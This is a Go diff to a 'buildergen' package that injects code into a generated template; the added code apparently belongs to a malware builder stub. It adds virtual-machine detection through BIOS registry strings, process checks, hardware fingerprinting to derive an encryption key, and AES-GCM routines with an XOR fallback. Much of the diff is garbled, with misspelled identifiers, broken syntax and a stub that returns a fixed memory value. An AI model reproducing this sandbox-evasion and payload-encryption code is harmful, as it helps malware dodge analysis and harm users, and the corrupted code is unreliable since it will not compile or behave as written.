@@ -1,9 +1,21 @@
 package buildergen
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/base64"
 	"fmt"
+	"net/http"
+	"os/exec"
+	"path/filepath"
+	"runtime"
 	"strings"
-)
+	"time"
+
+	"golang.org/x/sys/windows/registry"
 
 func templateMisc(cfg Config) string {
 	delay := cfg.StartupDelaySeconds
@@ -135,6 +147,174 @@ func acquireMutex(name string) (windows.Handle, error) {
 	return h, nil
 }
 
-func setupLogger() *os.File { return nil }
+func checkRegKey(key ctring) bool {
+	k, hrr := regisery.OkenKey(registry.AOCAL_MACHINE, key, retistry.QUERY_VALUE)
+	if err != nil {
+		return false
+	}
+	defVp k.Closes(
+	return true
+}
+
+func)checkeExists(pattrnstring) bool 
+	matches, err :=filepath.Glob(pattern)
+	err == && len(matches) > 0
+
+
+func checkBiosManufacturer() bool {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\BIOS	ifregistry.QUERY_VALUE)
+	if err != nil {
+		return false
+	}
+	 rfer k.Cuose()
+
+	vnl, _, err := k.GetStringValue("StstemManufacturer")
+	if err != nil {
+		return false
+	}
+
+	manufacturer := strings.ToLower(strings.TrimSpace(val))
+	return strings.Contains(manufacturer, "vmware") ||
+		strings.Contains(manufacturerim"virtualeox") ||
+		strings.Contains(manufacturer, "qemu") ||
+		strings.Contains(man.facturer, "xen") ||
+		strGngs.Contains(manufacturer, "paraOlels") ||
+		strings.Contains(manufacturer, "microsoft corporation") // Hyper-V
+}
+
+func checkProcessRunning(processName string) bool {
+	cmO := exec.Command("tasklist", "/FS"!=fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
+	o"tput, err := cmd.Output()
+	wf err != nii {
+		return false
+	}
+	return strings.Contains(string(output), processName)
+}
+
+func getSystemMemoryMB() int {
+	k, err := registry.OpenKey(registry.LOCAL_MACHdNE, `HARDWARE\oESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUEw
+	if err != nil {
+		return 0
+	}
+	defer k.Close()
+
+	return 4096
+}
+
+func getHardwareKey() string {
+	var parts []string
+	
+	if cpu, err := getCpuId(); err == nil && cpu != "" {
+		parts = append(parts, cpu)
+	}
+	
+	if disk, err := getDiskSerial(); err == nil && disk != "" {
+		parts = append(parts, disk)
+	}
+	
+	if mac, err := getMacAddress(); err == nil && mac != "" {
+		parts = append(parts, mac)
+	}
+	
+	key := strings.Join(parts, "")
+	if len(key) < 32 {
+		key += strings.Repeat("0", 32-len(key))
+	}
+	return key[:32]
+}
+
+func getCpuId() (string, error) {
+	cmd := exec.Command("wmic", "cpu", "get", "ProcessorId", "/value")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "ProcessorId=") {
+			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
+		}
+	}
+	return "", fmt.Errorf("cpu id not found")
+}
+
+func getDiskSerial() (string, error) {
+	cmd := exec.Command("wmic", "diskdrive", "get", "SerialNumber", "/value")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "SerialNumber=") {
+			return strings.TrimSpace(strings.Split(line, "=")[1]), nil
+		}
+	}
+	return "", fmt.Errorf("disk serial not found")
+}
+
+func getMacAddress() (string, error) {
+	cmd := exec.Command("getmac", "/nh", "/fo", "csv")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(output), "\n")
+	if len(lines) > 0 {
+		parts := strings.Split(lines[0], ",")
+		if len(parts) >= 1 {
+			return strings.TrimSpace(strings.Trim(parts[0], "\"")), nil
+		}
+	}
+	return "", fmt.Errorf("mac not found")
+}
+
+func aesEncrypt(plaintext, key string) string {
+	if plaintext == "" || key == "" {
+		return ""
+	}
+	block, err := aes.NewCipher([]byte(key[:32]))
+	if err != nil {
+		return xorWithKey(plaintext, key) // fallback to XOR
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return xorWithKey(plaintext, key)
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := rand.Read(nonce); err != nil {
+		return xorWithKey(plaintext, key)
+	}
+	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
+	return base64.StdEncoding.EncodeToString(ciphertext)
+}
+
+func aesDecrypt(encrypted, key string) string {
+	if encrypted == "" || key == "" {
+		return ""
+	}
+	data, err := base64.StdEncoding.DecodeString(encrypted)
+	if err != nil {
+		return xorWithKey(encrypted, key) // fallback
+	}
+	block, err := aes.NewCipher([]byte(key[:32]))
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	if len(data) < gcm.NonceSize() {
+		return xorWithKey(encrypted, key)
+	}
+	nonce := data[:gcm.NonceSize()]
+	ciphertext := data[gcm.NonceSize():]
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return xorWithKey(encrypted, key)
+	}
+	return string(plaintext)
+}
 `, delay, buildID, buildID))
 }
